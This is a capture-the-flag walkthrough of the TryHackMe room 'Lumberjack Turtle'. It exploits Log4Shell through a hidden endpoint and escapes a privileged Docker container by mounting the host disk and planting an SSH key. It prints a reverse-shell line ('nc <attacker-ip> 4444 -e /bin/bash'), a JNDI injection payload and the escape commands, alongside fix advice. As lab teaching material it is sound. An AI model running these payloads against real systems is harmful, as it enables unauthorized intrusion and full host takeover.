@@ -1,0 +1,162 @@
+---
+title: 'Lumberjack Turtle'
+description: 'A hidden /log4j endpoint is vulnerable to Log4Shell; exploiting it for root inside a privileged Docker container, then escaping to the host by mounting its raw disk and dropping an SSH key.'
+date: 2026-01-04
+platform: tryhackme
+room: 'Lumberjack Turtle'
+roomUrl: 'https://tryhackme.com/room/lumberjackturtle'
+difficulty: medium
+tags:
+  - 'log4shell'
+  - 'jndi'
+  - 'rce'
+  - 'docker'
+  - 'container-escape'
+  - 'linux'
+  - 'cve'
+vulnClasses:
+  - 'jndi injection'
+  - 'authenticated remote code execution'
+  - 'privileged container escape'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Lumberjack Turtle — Log4Shell to Root, Then a Privileged-Container Disk-Mount Escape**
+
+_A walkthrough of the "Lumberjack Turtle" TryHackMe room. A hidden_ _`/log4j`_ _endpoint is vulnerable to Log4Shell (CVE-2021-44228); exploiting it for a root shell inside a Docker container, then escaping the container entirely by mounting the host's raw disk and planting our own SSH key._
+
+> The flag is redacted. Lumberjack Turtle is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` are real on the box but withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Directory brute-forcing an oddly-named web service turns up a hidden **`/~logs/log4j`** endpoint, and a response header all but names the bug: **CVE-2021-44228 (Log4Shell)** via the `X-Api-Version` header → building a JNDI/LDAP exploit chain with `marshalsec` gets a **root shell inside a Docker container** → the container turns out to be running **privileged**, so the host's raw disks are visible from inside it → mounting the host's root partition and dropping our own SSH public key into `/root/.ssh/authorized_keys` gets us a real shell on the **host itself**, past a deliberately-decoy `root.txt`.
+
+Hidden endpoint → Log4Shell JNDI RCE → root in a privileged container → raw-disk mount → SSH-key plant → real host root.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+```
+
+Port 80 fingerprints itself as "Nagios NSCA," but serving behavior doesn't match — directory brute-forcing is needed to find anything real.
+
+### **The vulnerability: a hidden endpoint and a header that names its own CVE**
+
+```text
+gobuster dir -u http://$IP/ -w dirb/big.txt
+# /~logs  [Status: 200]
+gobuster dir -u http://$IP/~logs -w dirb/big.txt
+# /log4j  [Status: 200]
+```
+
+<Callout type="insight">
+
+Requesting `/~logs/log4j` returns a response header, `X-THM-HINT: CVE-2021-44228 against X-Api-Version`, that tells us exactly which header carries the injection and exactly which CVE to exploit — **Log4Shell**, the Log4j2 JNDI-lookup remote-code-execution bug.
+
+</Callout>
+
+### **Step 1 — build the JNDI/LDAP exploit chain**
+
+```text
+git clone https://github.com/mbechler/marshalsec.git && cd marshalsec
+mvn clean package -DskipTests
+```
+
+```text
+# Exploit.java — runs on load, connects back to us
+static {
+    Runtime.getRuntime().exec("nc <attacker-ip> 4444 -e /bin/bash");
+}
+javac Exploit.java -source 8 -target 8
+```
+
+```text
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://<attacker-ip>:8080/#Exploit'
+python3 -m http.server 8080     # serves Exploit.class
+nc -lvnp 9999                   # catches the shell
+```
+
+### **Step 2 — trigger it over the vulnerable header**
+
+```text
+curl "http://$IP/~logs/log4j" -H 'X-Api-Version: ${jndi:ldap://<attacker-ip>:1389/Exploit}'
+```
+
+```text
+# on the listener:
+id   # uid=0(root) gid=0(root)
+cat /opt/.flag1   # -> THM{<redacted>}
+```
+
+### **Step 3 — a privileged container exposes the host's raw disks**
+
+```text
+ip a
+# eth0: 172.17.0.2/16   <- classic docker0 bridge address, we're in a container
+```
+
+<Callout type="insight">
+
+A correctly-sandboxed container should refuse `fdisk -l` outright — device nodes for the host's physical disks simply shouldn't be visible. Seeing them succeed is the signal that this container was started with `--privileged` (or an equivalent `--device` grant), which hands it direct access to host hardware.
+
+</Callout>
+
+```text
+fdisk -l
+# /dev/nvme0n1: 40 GiB  <- the host's actual root disk, visible from inside the container
+mkdir /mnt/mount1
+mount /dev/nvme0n1p1 /mnt/mount1
+cat /mnt/mount1/root/root.txt
+# "Pffft. Come on. Look harder."   <- a deliberate decoy
+```
+
+### **Step 4 — plant an SSH key and log in to the real host**
+
+```text
+ssh-keygen -f ./id_rsa -N ''
+echo "<our-public-key>" >> /mnt/mount1/root/.ssh/authorized_keys
+```
+
+```text
+ssh -i id_rsa root@$IP
+# this is now the real host, not the container
+ls -la          # a hidden "..." directory
+cat "/root/.../._fLaG2"   # -> THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 10.0** (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`). Unauthenticated RCE to full host root, via two independently severe misconfigurations:
+
+- **Log4Shell remains exploitable** on an internet-reachable endpoint, giving unauthenticated remote code execution.
+- **A privileged container with no isolation from host hardware** turns "root inside a container" into "root on the physical disk" with a single `mount` command — no kernel exploit, no breakout CVE, just a volume mount.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Patch Log4j to ≥2.17.1**, or at minimum disable JNDI lookups (`log4j2.formatMsgNoLookups=true`) as an emergency mitigation, and strip/validate any header value before it reaches a logging call.
+2. **Never run application containers with** **`--privileged`\*\***.\*\* Grant only the specific capabilities and device nodes a workload genuinely needs, and run containers rootless where possible.
+3. **Never leave a usable** **`authorized_keys`** **file writable by a process running as root inside any container that shares host resources** — treat the container boundary as the actual trust boundary it's supposed to be.
+
+</Callout>
+
+### **Takeaways**
+
+- **A response header can be the exploit's own documentation.** Vulnerable labs sometimes hint broadly, but in the real world the same lesson applies: check every reflected header name for injection potential.
+- **"Root inside a container" and "root on the host" are very different things — until** **`--privileged`** **makes them the same thing.** Always verify container isolation before assuming a container compromise is contained.
+- **A decoy flag is still useful signal.** If a trophy file looks suspiciously taunting, there's probably a second, real one nearby.
+
+Thanks for reading. Lumberjack Turtle pairs one of the internet's most consequential CVEs with a container-escape pattern that's painfully easy to reproduce whenever `--privileged` gets used out of convenience rather than necessity.
